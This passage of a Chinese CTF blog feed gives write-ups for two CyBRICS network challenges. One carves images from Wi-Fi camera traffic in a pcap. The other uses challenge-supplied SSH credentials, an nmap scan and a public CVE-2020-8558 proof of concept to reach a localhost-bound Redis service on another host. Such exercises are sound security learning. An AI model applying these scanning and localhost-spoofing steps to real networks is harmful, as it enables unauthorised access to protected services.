+&lt;p>参考：&lt;a href="https://www.shuzhiduo.com/A/RnJW9QLBdq/">调皮捣蛋的Linux下有趣终端的合集&lt;/a> | &lt;a href="https://www.howtoing.com/create-ascii-text-banners-in-linux-terminal">Linux Fun - 如何在终端中创建ASCII文本横幅&lt;/a> | &lt;a href="https://www.howtoing.com/neofetch-shows-linux-system-information-with-logo/">Neofetch - 显示具有分发标志的Linux系统信息&lt;/a>&lt;/p>
+&lt;h2 id="lx-100-network-easy-192-pts">LX-100 (Network, Easy, 192 pts)&lt;/h2>
+&lt;blockquote>
+&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
+&lt;p>We were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.&lt;/p>
+&lt;p>Anyway, we were discussing CyBRICS flags there, hope there’s no way to leak them.&lt;/p>
+&lt;p>&lt;a href="https://cybrics.net/files/lx100.pcap">&lt;strong>lx100.pcap&lt;/strong>&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>（说实话，pacp包是真的不会看TAT&lt;/p>
+&lt;p>首先看到有HTTP的流量，访问的是http://192.168.54.1/cam.cgi?mode=getstate，这是Lumix GX80摄像头，视频流通过UDP传输；追踪UDP流量，导出流量 并批量提取出其中的jpg文件
+（以下是官方给出的解 使用了tshark工具（即命令行版的wireshrk（但是这种方法本地复现失败 导出的jpg无法正常解析 但是&lt;a href="https://www.youtube.com/watch?v=Sf_0f8PWNuI&amp;amp;t=80s">官方视频中&lt;/a>确实这样可以成功 emmmm&lt;/p>
+&lt;pre>&lt;code>tshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data &amp;gt; hex.txt
+php -a
+foreach(file(&amp;quot;hex.txt&amp;quot;)as $i =&amp;gt; $ln) {file_put_contents(&amp;quot;frame$i.jpg&amp;quot;,hex2bin(trim($ln)));}
+&lt;/code>&lt;/pre>&lt;p>（以下是在&lt;a href="https://scavengersecurity.com/posts/cybrics-lx100/">别的wp&lt;/a>中看到的py脚本： 可成功复现 导出455张jpg图&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pyshark&lt;/span>
+&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pyshark&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FileCapture&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lx100.pcap&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;UDP&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;udp&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">srcport&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">65415&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;span style="color:#111">udp_bytes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fromhex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">find&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ffd8ffdb&amp;#39;&lt;/span>&lt;span style="color:#111">):])&lt;/span>
+&lt;span style="color:#111">file_out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;out_files/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">count&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;_packet.jpg&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;wb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">file_out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">udp_bytes&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/235_packet.jpg" alt="235_packet">&lt;/p>
+&lt;p>&lt;del>放大 再放大 每一根&lt;/del> 最后的flag是 &lt;code>cybrics{Lost_Secrets_In_The_AIr}&lt;/code>&lt;/p>
+&lt;h2 id="localhost-network-hard-267-pts">localhost (Network, Hard, 267 pts)&lt;/h2>
+&lt;blockquote>
+&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
+&lt;p>Remember NET fleeks? I’ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.&lt;/p>
+&lt;pre>&lt;code>ssh localhost@109.233.61.10
+Password: ohx7eeQu
+&lt;/code>&lt;/pre>&lt;p>Your team token &amp;gt; Sw0T5cecsfJfaKApOiKzsA&lt;/p>
+&lt;/blockquote>
+&lt;p>先ssh连上看看情况（图中有一句命令输错了 应该是routes 留下了英语不好的泪水&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729122432345.png" alt="image-20210729122432345">&lt;/p>
+&lt;p>自带python2 python3 nmap，并且本身就是root身份，扫一下内网网段&lt;code>nmap -sS -Pn 10.193.10.7/24&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131318834.png" alt="image-20210729131318834">&lt;/p>
+&lt;p>发现10.193.10.180的80端口开放，用curl访问&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131419115.png" alt="image-20210729131419115">&lt;/p>
+&lt;p>提示&lt;em>Flag-containing-Records&lt;/em> 接着访问两个超链接的内容&lt;/p>
+&lt;p>&lt;code>curl 10.193.10.180/redis.conf&lt;/code>是redis的配置文件，几乎所有的内容都是被注释掉的示例内容，有用的就内容并不多：&lt;/p>
+&lt;pre>&lt;code>bind 127.0.0.1
+protected-mod yes
+port 6379
+&lt;/code>&lt;/pre>&lt;p>&lt;code>curl 10.193.10.180/sysctl.conf&lt;/code>也是相关的配置文件 只有一句没被注释&lt;/p>
+&lt;pre>&lt;code>net.ipv4.conf.all.route_localnet=1
+&lt;/code>&lt;/pre>&lt;p>查google，发现了这些：&lt;a href="https://github.com/kubernetes/kubernetes/issues/90259">net.ipv4.conf.all.route_localnet=1 opens security issue #90259&lt;/a> | &lt;a href="https://github.com/tabbysable/POC-2020-8558">POC-2020-8558&lt;/a>&lt;/p>
+&lt;p>是一个去年爆出的cve，具体的内容 成因以及背景知识不多赘述 上面的链接中写的很详细，这里摘取几段：&lt;/p>
+&lt;blockquote>
+&lt;p>In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code> sysctl setting. According to the kernel documentation, this setting makes the kernel &amp;ldquo;not consider loopback addresses as martian&amp;rdquo; &amp;ndash; a consequence of which is that they could be accessed by other nodes on the network. That&amp;rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!&lt;/p>
+&lt;p>&amp;hellip;&amp;hellip;&lt;/p>
+&lt;p>A normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code> changes that &amp;ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.&lt;/p>
+&lt;p>So, if an attacker has a local connection to a target node with &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code>, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.&lt;/p>
+&lt;p>Note that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker&amp;rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.&lt;/p>
+&lt;/blockquote>
+&lt;p>（不得不说ipv4当初把整个&lt;code>127.0.0.0/8&lt;/code>的地址都给了本地回环用真的是太慷慨了&amp;hellip;&amp;hellip; 到ipv6就只有一个&lt;code>:: 1&lt;/code>&lt;/p>
+&lt;p>在这里直接用poc打即可，关于test.py和poc.py这里也摘取一下说明&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>tst-2020-8558.py&lt;/strong>
+Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to &lt;code>127.0.0.1&lt;/code> via your target, and looks to see if there is a reply.&lt;/p>
+&lt;p>&lt;strong>poc-2020-8558.py&lt;/strong>
+Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default).
+Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal.
+Because this script uses raw sockets to send and receive the &amp;ldquo;localhost&amp;rdquo; packets, it works fine inside a normal unprivileged container.&lt;/p>
+&lt;/blockquote>
+&lt;p>因为需要nc 所以另开一个shell&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153443403.png" alt="image-20210729153443403">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153501930.png" alt="image-20210729153501930">&lt;/p>
+&lt;p>参考：&lt;a href="https://jan.show/?p=128">wp&lt;/a> | &lt;a href="https://www.zhihu.com/question/49866806">为什么整个127.*网段都被拿来当做环回地址了？&lt;/a>&lt;/p>
+&lt;hr>
+&lt;p>本人比较菜，只做出来了签到题和几个web，其余均为赛后复盘，&lt;a href="https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw">此处是参考wp&lt;/a>&lt;/p>
+&lt;p>道阻且长呀，暑假要好好努力咯 (つд⊂)
+参照一些教程把简单的博客也搭起来了，以后要把这个小窝慢慢丰富起来(ゝ∀･)☆&lt;/p></description></item></channel></rss>
